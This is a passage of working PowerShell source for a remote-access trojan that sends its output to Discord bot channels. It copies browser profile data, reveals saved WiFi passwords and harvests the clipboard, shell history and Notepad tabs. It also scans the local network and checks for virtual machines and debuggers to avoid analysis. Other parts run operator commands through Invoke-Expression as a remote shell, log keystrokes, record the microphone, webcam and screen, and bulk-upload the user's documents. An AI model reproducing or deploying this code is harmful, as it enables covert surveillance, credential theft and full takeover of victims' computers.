                $random = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
                $newName = if ($Db) { "$($file.BaseName)_$random$($file.Extension).db" } else { "$($file.BaseName)_$random$($file.Extension)" }
                $destination = Join-Path -Path $Dest -ChildPath $newName
                Copy-Item -Path $file.FullName -Destination $destination -Force
            }
        }
        $googleDir = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
        $firefoxDir = (Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' }).FullName
        $edgeDir = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
        Copy-Files -Source $googleDir -Dest $dirs.google -Db
        Copy-Files -Source $firefoxDir -Dest $dirs.firefox
        Copy-Files -Source $edgeDir -Dest $dirs.edge -Db
        $zipFile = Join-Path -Path $temp -ChildPath "dbfiles.zip"
        Compress-Archive -Path $tempFolder -DestinationPath $zipFile -Force
        Remove-Item -Path $tempFolder -Recurse -Force
        Send-LootFile -FilePath $zipFile
        Remove-Item -Path $zipFile -Force
    }
    function Get-SystemDetails {
        Send-LootMessage -Message ":computer: ``Gathering system information for $env:COMPUTERNAME`` :computer:"
        Add-Type -AssemblyName System.Windows.Forms
        $userInfo = Get-WmiObject -Class Win32_UserAccount
        $fullName = ($userInfo.FullName | Where-Object { $_ }) -join ", "
        $email = (Get-ComputerInfo).WindowsRegisteredOwner
        $users = ($userInfo.Name | Where-Object { $_ }) -join ", "
        $systemLocale = Get-WinSystemLocale
        $systemLanguage = $systemLocale.Name
        $userLanguageList = Get-WinUserLanguageList
        $keyboardLayout = $userLanguageList[0].InputMethodTips[0]
        $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
        $osString = "$($systemInfo.Caption)"
        $winVersion = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
        $osArch = "$($systemInfo.OSArchitecture)"
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $screenSize = "$($screen.Width) x $($screen.Height)"
        function Convert-BytesToDatetime([byte[]]$b) {
            [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
            [datetime]::FromFileTime($f)
        }
        $regKey = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy
        $totalSize = [System.BitConverter]::ToUInt32($regKey, 0)
        $value = 0x14
        $activated = $null
        while ($true) {
            $keySize = [System.BitConverter]::ToUInt16($regKey, $value)
            $keyNameSize = [System.BitConverter]::ToUInt16($regKey, $value + 2)
            $keyDataSize = [System.BitConverter]::ToUInt16($regKey, $value + 6)
            $keyName = [System.Text.Encoding]::Unicode.GetString($regKey[($value + 0x10)..($value + 0x0F + $keyNameSize)])
            if ($keyName -eq 'Security-SPP-LastWindowsActivationTime') {
                $activated = Convert-BytesToDatetime($regKey[($value + 0x10 + $keyNameSize)..($value + 0x0F + $keyNameSize + $keyDataSize)])
            }
            $value += $keySize
            if (($value + 4) -ge $totalSize) { break }
        }
        Add-Type -AssemblyName System.Device
        $geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $geoWatcher.Start()
        while (($geoWatcher.Status -ne 'Ready') -and ($geoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
        $gps = if ($geoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
            $gl = $geoWatcher.Position.Location | Select-Object Latitude, Longitude
            "LAT = $($gl.Latitude.ToString('F6')) LONG = $($gl.Longitude.ToString('F6'))"
        }
        $processorInfo = Get-WmiObject -Class Win32_Processor
        $processor = "$($processorInfo.Name)"
        $videoCardInfo = Get-WmiObject Win32_VideoController
        $gpu = "$($videoCardInfo.Name)"
        $ramInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | ForEach-Object { "{0:N1} GB" -f ($_.Sum / 1GB) }
        $computerSystemInfo = (Get-WmiObject -Class Win32_ComputerSystem | Out-String).Trim()
        $hddInfo = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, FileSystem, 
            @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1GB)}}, 
            @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1GB)}}, 
            @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f (($_.FreeSpace / $_.Size) * 100)}} | Format-List | Out-String
        $diskHealth = Get-PhysicalDisk | Select-Object FriendlyName, OperationalStatus, HealthStatus | Format-List | Out-String
        function Get-PerformanceMetrics {
            $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            [PSCustomObject]@{
                CPUUsage = "{0:F2}%" -f $cpuUsage.CookedValue
                MemoryUsage = "{0:F2}%" -f $memoryUsage.CookedValue
                DiskIO = "{0:F2} transfers/sec" -f $diskIO.CookedValue
                NetworkIO = "{0:F2} bytes/sec" -f $networkIO.CookedValue
            }
        }
        $metrics = Get-PerformanceMetrics
        $avInfo = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName | Out-String).Trim()
        $publicIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
        $wifiProfiles = (netsh wlan show profiles) -replace ".*:\s+" | Where-Object { $_ -and $_ -notmatch "policy|-----|<None>" }
        $outSsid = ""
        foreach ($s in $wifiProfiles) {
            $ssid = $s.Trim()
            if ($s -match ":") { $ssid = $s.Split(":")[1].Trim() }
            $pw = (netsh wlan show profiles name=$ssid key=clear) | Where-Object { $_ -match "Key Content" }
            $pass = if ($pw) { $pw.Split(":")[1].Trim() } else { "None" }
            $outSsid += "SSID: $ssid | Password: $pass`n"
        }
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object SuffixOrigin -eq "Dhcp" | Select-Object -ExpandProperty IPAddress)
        $scanResult = ""
        if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
            $subnet = $matches[1]
            1..254 | ForEach-Object { Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_" }
            $computers = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +',',' | ConvertFrom-Csv -Header Computername,IPv4,MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
            foreach ($comp in $computers) {
                try {
                    $hostname = ([System.Net.Dns]::GetHostEntry($comp.IPv4)).HostName
                    $scanResult += "IP: $($comp.IPv4)`nMAC: $($comp.MAC)`nHostname: $hostname`n`n"
                } catch {
                    $scanResult += "IP: $($comp.IPv4)`nMAC: $($comp.MAC)`nHostname: N/A`n`n"
                }
            }
        }
        $nearbyWifi = (netsh wlan show networks mode=Bssid | Where-Object { $_ -match "SSID|Signal|Band" }).Trim() | Format-Table SSID, Signal, Band | Out-String
        $isVM = $false
        $isDebug = $false
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $width = $screen.Bounds.Width
        $height = $screen.Bounds.Height
        $networkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
        $services = Get-Service
        $vmServices = @('vmtools', 'vmmouse', 'vmhgfs', 'vmci', 'VBoxService', 'VBoxSF')
        $manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
        $vmManufacturers = @('Microsoft Corporation', 'VMware, Inc.', 'Xen', 'innotek GmbH', 'QEMU')
        $model = (Get-WmiObject Win32_ComputerSystem).Model
        $vmModels = @('Virtual Machine', 'VirtualBox', 'KVM', 'Bochs')
        $bios = (Get-WmiObject Win32_BIOS).Manufacturer
        $vmBios = @('Phoenix Technologies LTD', 'innotek GmbH', 'Xen', 'SeaBIOS')
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DebuggerCheck {
    [DllImport("kernel32.dll")] public static extern bool IsDebuggerPresent();
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
}
"@
        $isDebuggerPresent = [DebuggerCheck]::IsDebuggerPresent()
        $isRemoteDebuggerPresent = $false
        [DebuggerCheck]::CheckRemoteDebuggerPresent([System.Diagnostics.Process]::GetCurrentProcess().Handle, [ref]$isRemoteDebuggerPresent) | Out-Null
        if ($isDebuggerPresent -or $isRemoteDebuggerPresent) { $isDebug = $true }
        $commonResolutions = @("1280x720","1280x800","1280x1024","1366x768","1440x900","1600x900","1680x1050","1920x1080","1920x1200","2560x1440","3840x2160")
        $currentResolution = "$width`x$height"
        $resCheck = if ($commonResolutions -contains $currentResolution) { "PASS" } else { "FAIL" }
        $manufacturerCheck = if ($vmManufacturers -contains $manufacturer) { "FAIL" } else { "PASS" }
        $modelCheck = if ($vmModels -contains $model) { "FAIL" } else { "PASS" }
        $biosCheck = if ($vmBios -contains $bios) { "FAIL" } else { "PASS" }
        foreach ($service in $vmServices) { if ($services -match $service) { $isVM = $true } }
        $vmChecks = @{
            "VMwareTools" = "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"
            "VMwareMouseDriver" = "C:\WINDOWS\system32\drivers\vmmouse.sys"
            "VMwareSharedFoldersDriver" = "C:\WINDOWS\system32\drivers\vmhgfs.sys"
            "SystemBiosVersion" = "HKLM:\HARDWARE\Description\System\SystemBiosVersion"
            "VBoxGuestAdditions" = "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions"
            "VideoBiosVersion" = "HKLM:\HARDWARE\Description\System\VideoBiosVersion"
            "VBoxDSDT" = "HKLM:\HARDWARE\ACPI\DSDT\VBOX__"
            "VBoxFADT" = "HKLM:\HARDWARE\ACPI\FADT\VBOX__"
            "VBoxRSDT" = "HKLM:\HARDWARE\ACPI\RSDT\VBOX__"
            "SystemBiosDate" = "HKLM:\HARDWARE\Description\System\SystemBiosDate"
        }
        foreach ($check in $vmChecks.GetEnumerator()) { if (Test-Path $check.Value) { $isVM = $true } }
        foreach ($adapter in $networkAdapters) {
            $macAddress = $adapter.MACAddress -replace ":", ""
            if ($macAddress.StartsWith("080027") -or $macAddress.StartsWith("000569") -or $macAddress.StartsWith("000C29") -or $macAddress.StartsWith("001C14")) { $isVM = $true }
        }
        $taskManagers = @("taskmgr","procmon","procmon64","procexp","procexp64","perfmon","perfmon64","resmon","resmon64","ProcessHacker")
        $runningTaskManagers = (Get-Process | Where-Object { $taskManagers -contains $_.Name } | Select-Object -ExpandProperty Name) -join ", "
        if (-not $runningTaskManagers) { $runningTaskManagers = "None Found" }
        $vmDetect = if ($isVM) { "FAIL" } else { "PASS" }
        $debugDetect = if ($isDebug) { "FAIL" } else { "PASS" }
        $clipboard = Get-Clipboard
        if (-not $clipboard) { $clipboard = "No Data Found" }
        $paths = @{
            'chrome_history' = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            'chrome_bookmarks' = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            'edge_history' = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
            'edge_bookmarks' = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
            'firefox_history' = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            'opera_history' = "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
            'opera_bookmarks' = "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
        }
        $outPath = "$env:Temp\Browsers.txt"
        $browsers = @('chrome', 'edge', 'firefox', 'opera')
        $dataValues = @('history', 'bookmarks')
        foreach ($browser in $browsers) {
            foreach ($dataValue in $dataValues) {
                $pathKey = "${browser}_${dataValue}"
                $path = $paths[$pathKey]
                $entry = Get-Content -Path $path -ErrorAction SilentlyContinue | Select-String -AllMatches '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' | ForEach-Object { ($_.Matches).Value } | Sort-Object -Unique
                $entry | ForEach-Object { [PSCustomObject]@{ Browser = $browser; DataType = $dataValue; Content = $_ } } | Out-File -FilePath $outPath -Append
            }
        }
        $browserData = (Get-Content -Path $outPath -ErrorAction SilentlyContinue | Out-String).Trim()
        $usbDevices = (Get-WmiObject Win32_USBControllerDevice | ForEach-Object { [Wmi]($_.Dependent) } | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String).Trim()
        $processes = (Get-WmiObject Win32_Process | Select-Object Handle, ProcessName, ExecutablePath | Out-String).Trim()
        $services = (Get-CimInstance -ClassName Win32_Service | Where-Object { $_.State -eq 'Running' } | Select-Object State, Name, StartName, PathName | Out-String).Trim()
        $software = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String).Trim()
        $drivers = (Get-WmiObject Win32_PnPSignedDriver | Where-Object { $_.DeviceName } | Select-Object DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String).Trim()
        $psHistory = (Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Raw -ErrorAction SilentlyContinue | Out-String).Trim()
        $recentFiles = (Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime | Out-String).Trim()
        function Get-NotepadTabs {
            $appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
            $matchingDirs = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
            $outPath = "$env:Temp\Browsers.txt"
            foreach ($dir in $matchingDirs) {
                $tabPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
                $binFiles = Get-ChildItem -Path $tabPath -Filter *.bin
                foreach ($file in $binFiles) {
                    if ($file.Name -like '*.0.bin' -or $file.Name -like '*.1.bin') { continue }
                    $contents = [System.IO.File]::ReadAllBytes($file.FullName)
                    $isSaved = $contents[3]
                    "=" * 60 | Out-File -FilePath $outPath -Append
                    if ($isSaved -eq 1) {
                        $length = $contents[4]
                        $filenameEnd = 5 + $length * 2
                        $filename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnd - 1)])
                        "Found saved file: $filename" | Out-File -FilePath $outPath -Append
                        $file.Name | Out-File -FilePath $outPath -Append
                        "-" * 60 | Out-File -FilePath $outPath -Append
                        Get-Content -Path $filename -Raw -ErrorAction SilentlyContinue | Out-File -FilePath $outPath -Append
                    } else {
                        "Found an unsaved tab!" | Out-File -FilePath $outPath -Append
                        $file.Name | Out-File -FilePath $outPath -Append
                        "-" * 60 | Out-File -FilePath $outPath -Append
                        $delimiterStart = [array]::IndexOf($contents, 0, 0)
                        $delimiterEnd = [array]::IndexOf($contents, 3, 0)
                        $fileMarker = $contents[($delimiterStart + 2)..($delimiterEnd - 1)] | ForEach-Object { [char]$_ } | Join-String
                        $fileContent = $contents[($delimiterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)] | Where-Object { $_ -ne 0 } | ForEach-Object { [char]$_ } | Join-String
                        $fileContent | Out-File -FilePath $outPath -Append
                    }
                    "`n" | Out-File -FilePath $outPath -Append
                }
            }
        }
        $infoMessage = @"
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================

=======================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=======================================
User Information
---------------------------------------
Current User: $env:USERNAME
Full Name: $fullName
Email: $email
Other Users: $users

OS Information
---------------------------------------
Language: $systemLanguage
Keyboard Layout: $keyboardLayout
OS: $osString
Build ID: $winVersion
Architecture: $osArch
Screen Size: $screenSize
Activation Date: $activated
Location: $gps

Hardware Information
---------------------------------------
Processor: $processor
Memory: $ramInfo
GPU: $gpu

System Information
---------------------------------------
$computerSystemInfo

Storage
---------------------------------------
$hddInfo

Disk Health
---------------------------------------
$diskHealth

System Metrics
---------------------------------------
$($metrics.CPUUsage)
$($metrics.MemoryUsage)
$($metrics.DiskIO)
$($metrics.NetworkIO)

Antivirus Providers
---------------------------------------
$avInfo

Network Information
---------------------------------------
Public IP: $publicIP
Local IP: $localIP

Saved WiFi Networks
---------------------------------------
$outSsid

Nearby WiFi Networks
---------------------------------------
$nearbyWifi

Other Network Devices
---------------------------------------
$scanResult

Virtual Machine Test
---------------------------------------
Resolution: $resCheck
Manufacturer: $manufacturerCheck
Model: $modelCheck
BIOS: $biosCheck
VM Check: $vmDetect

Debugging Software
---------------------------------------
Debug Check: $debugDetect
Running Task Managers: $runningTaskManagers

History Information
---------------------------------------
Clipboard: $clipboard
Browser Data: 
$browserData

PowerShell History
---------------------------------------
$psHistory

Recent Files
---------------------------------------
$recentFiles

USB Devices
---------------------------------------
$usbDevices

Software
---------------------------------------
$software

Running Services
---------------------------------------
$services

Current Processes
---------------------------------------
$processes
"@
        $outPath = "$env:Temp\systeminfo.txt"
        $infoMessage | Out-File -FilePath $outPath -Encoding ASCII
        if ($osString -like '*11*') { Get-NotepadTabs }
        else { "No notepad tabs (Windows 10 or below)" | Out-File -FilePath $outPath -Encoding ASCII -Append }
        $resultLines = $infoMessage -split "`n"
        $currentBatch = ""
        foreach ($line in $resultLines) {
            $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
            if (([System.Text.Encoding]::Unicode.GetByteCount($currentBatch) + $lineSize) -gt 1900) {
                Send-LootMessage -Message "``````$currentBatch``````"
                Start-Sleep -Seconds 1
                $currentBatch = ""
            }
            $currentBatch += "$line`n"
        }
        if ($currentBatch) { Send-LootMessage -Message "``````$currentBatch``````" }
        Send-LootFile -FilePath $outPath
        Remove-Item -Path $outPath -Force
    }
    function Get-FolderTree {
        Send-LootMessage -Message ":arrows_counterclockwise: ``Generating file trees...`` :arrows_counterclockwise:"
        tree $env:USERPROFILE\Desktop /A /F | Out-File "$env:Temp\Desktop.txt"
        tree $env:USERPROFILE\Documents /A /F | Out-File "$env:Temp\Documents.txt"
        tree $env:USERPROFILE\Downloads /A /F | Out-File "$env:Temp\Downloads.txt"
        $zipFile = "$env:Temp\TreesOfKnowledge.zip"
        Compress-Archive -Path "$env:Temp\Desktop.txt","$env:Temp\Documents.txt","$env:Temp\Downloads.txt" -DestinationPath $zipFile -Force
        Send-LootFile -FilePath $zipFile
        Remove-Item -Path $zipFile -Force
        Remove-Item -Path "$env:Temp\Desktop.txt","$env:Temp\Documents.txt","$env:Temp\Downloads.txt" -Force
    }
    Send-LootMessage -Message ":hourglass_flowing_sand: ``$env:COMPUTERNAME collecting loot files... Please wait`` :hourglass_flowing_sand:"
    Get-SystemDetails
    Get-BrowserData
    Get-FolderTree
}

$powershellJob = {
    param ([string]$Token, [string]$PowershellID)
    function Get-BotUserId {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $Token")
        $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me") | ConvertFrom-Json
        return $botInfo.id
    }
    $botId = Get-BotUserId
    Start-Sleep -Seconds 5
    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $Token")
    function Send-Directory {
        $dir = $PWD.Path
        $wc.Headers.Add("Content-Type", "application/json")
        $json = @{"content" = "``PS | $dir >``"} | ConvertTo-Json
        $wc.UploadString($url, "POST", $json)
    }
    Send-Directory
    $lastTimestamp = $null
    while ($true) {
        $messages = $wc.DownloadString($url) | ConvertFrom-Json
        $recent = $messages[0]
        if ($recent.author.id -ne $botId -and $recent.timestamp -ne $lastTimestamp) {
            $lastTimestamp = $recent.timestamp
            $command = $recent.content
            $output = Invoke-Expression $command -ErrorAction SilentlyContinue
            $resultLines = $output -split "`n"
            $currentBatch = @()
            $currentSize = 0
            foreach ($line in $resultLines) {
                $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
                if (($currentSize + $lineSize) -gt 1900) {
                    $wc.Headers.Add("Content-Type", "application/json")
                    $json = @{"content" = "``````$($currentBatch -join "`n")``````"} | ConvertTo-Json
                    $wc.UploadString($url, "POST", $json)
                    Start-Sleep -Seconds 1
                    $currentBatch = @()
                    $currentSize = 0
                }
                $currentBatch += $line
                $currentSize += $lineSize
            }
            if ($currentBatch) {
                $wc.Headers.Add("Content-Type", "application/json")
                $json = @{"content" = "``````$($currentBatch -join "`n")``````"} | ConvertTo-Json
                $wc.UploadString($url, "POST", $json)
            }
            Send-Directory
        }
        Start-Sleep -Seconds 3
    }
}

$keyJob = {
    param ([string]$Token, [string]$KeyID)
    function Send-KeyMessage {
        param ([string]$Message)
        $url = "https://discord.com/api/v10/channels/$KeyID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $Token")
        $jsonBody = @{
            "content" = $Message
            "username" = $env:COMPUTERNAME
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $wc.UploadString($url, "POST", $jsonBody)
    }
    Send-KeyMessage -Message ":mag_right: ``Keylogger started`` :mag_right:"
    $api = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
    $api = Add-Type -MemberDefinition $api -Name Win32 -Namespace API -PassThru
    $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    $maxTime = [TimeSpan]::FromSeconds(10)
    $strBuild = New-Object System.Text.StringBuilder
    $keyMem = ""
    while ($true) {
        $down = $false
        try {
            while ($stopwatch.Elapsed -lt $maxTime) {
                Start-Sleep -Milliseconds 30
                for ($key = 8; $key -le 254; $key++) {
                    $keyState = $api::GetAsyncKeyState($key)
                    if ($keyState -eq -32767) {
                        $down = $true
                        $stopwatch.Restart()
                        $null = [Console]::CapsLock
                        $virtualKey = $api::MapVirtualKey($key, 3)
                        $kbState = New-Object Byte[] 256
                        $checkKbState = $api::GetKeyboardState($kbState)
                        if ($api::ToUnicode($key, $virtualKey, $kbState, $strBuild, $strBuild.Capacity, 0)) {
                            $collected = $strBuild.ToString()
                            if ($key -eq 27) { $collected = "[ESC]" }
                            if ($key -eq 8) { $collected = "[BACK]" }
                            if ($key -eq 13) { $collected = "[ENT]" }
                            $keyMem += $collected
                        }
                    }
                }
            }
        } finally {
            if ($down) {
                $escaped = $keyMem -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;') }
                Send-KeyMessage -Message ":mag_right: ``Keys captured: $escaped``"
                $keyMem = ""
                $down = $false
            }
        }
        $stopwatch.Restart()
        Start-Sleep -Milliseconds 10
    }
}

$audioJob = {
    param ([string]$Token, [string]$MicrophoneID, [string]$Webhook)
    function Send-AudioFile {
        param ([string]$FilePath)
        $url = "https://discord.com/api/v10/channels/$MicrophoneID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $Token")
        if (Test-Path $FilePath -PathType Leaf) {
            $wc.UploadFile($url, "POST", $FilePath)
            if ($Webhook) { $wc.UploadFile($Webhook, "POST", $FilePath) }
        }
    }
    $outputFile = "$env:Temp\Audio.mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -Name audio -Namespace system
    function Get-FriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        (Get-ItemProperty $reg).FriendlyName
    }
    $micId = [audio]::GetDefault(1)
    $micName = Get-FriendlyName $micId
    while ($true) {
        & "$env:Temp\ffmpeg.exe" -f dshow -i audio="$micName" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
        Send-AudioFile -FilePath $outputFile
        Remove-Item -Path $outputFile -Force
        Start-Sleep -Seconds 1
    }
}

$webcamJob = {
    param ([string]$Token, [string]$WebcamID)
    function Send-WebcamFile {
        param ([string]$FilePath)
        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $Token")
        if (Test-Path $FilePath -PathType Leaf) {
            $wc.UploadFile($url, "POST", $FilePath)
        }
    }
    Get-FFmpeg
    $outputFile = "$env:Temp\Webcam.jpg"
    while ($true) {
        & "$env:Temp\ffmpeg.exe" -f dshow -i video="Integrated Webcam" -frames:v 1 -q:v 2 -y $outputFile
        Send-WebcamFile -FilePath $outputFile
        Remove-Item -Path $outputFile -Force
        Start-Sleep -Seconds 5
    }
}

$screenshotJob = {
    param ([string]$Token, [string]$ScreenshotID)
    function Send-ScreenshotFile {
        param ([string]$FilePath)
        $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $Token")
        if (Test-Path $FilePath -PathType Leaf) {
            $wc.UploadFile($url, "POST", $FilePath)
        }
    }
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    while ($true) {
        $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $screenshot = New-Object Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
        $graphics.CopyFromScreen($screenBounds.X, $screenBounds.Y, 0, 0, $screenBounds.Size)
        $outputFile = "$env:Temp\Screen.jpg"
        $screenshot.Save($outputFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $screenshot.Dispose()
        Send-ScreenshotFile -FilePath $outputFile
        Remove-Item -Path $outputFile -Force
        Start-Sleep -Seconds 10
    }
}

# Additional Command Functions
function Start-Exfiltrate {
    param (
        [string]$Path,
        [string]$Filetype
    )
    $filesToExfiltrate = @("txt", "doc", "docx", "pdf", "jpg", "png", "xlsx", "xls", "csv", "zip", "rar", "log")
    if ($Filetype) {
        $filesToExfiltrate = @($Filetype)
    }
    $searchPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos"
    )
    if ($Path) {
        $searchPaths = @($Path)
    }
    Send-DiscordMessage -Message ":hourglass_flowing_sand: ``Starting exfiltration for $env:COMPUTERNAME...`` :hourglass_flowing_sand:"
    foreach ($searchPath in $searchPaths) {
        foreach ($ext in $filesToExfiltrate) {
            $files = Get-ChildItem -Path $searchPath -Recurse -Include "*.$ext" -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                if ($file.Length -lt 25MB) {
                    Send-DiscordFile -FilePath $file.FullName
                    Start-Sleep -Milliseconds 500
                }
            }
        }
    }
    Send-DiscordMessage -Message ":white_check_mark: ``Exfiltration completed for $env:COMPUTERNAME`` :white_check_mark:"
}

function Start-Upload {
    param ([string]$Path)
    if ($Path -and (Test-Path $Path -PathType Leaf)) {
        Send-DiscordFile -FilePath $Path
        Send-DiscordMessage -Message ":white_check_mark: ``File uploaded: $Path`` :white_check_mark:"
    } else {
        Send-DiscordMessage -Message ":x: ``Invalid file path: $Path`` :x:"
    }
}

function Start-Download {
    param (
        [string]$Url,
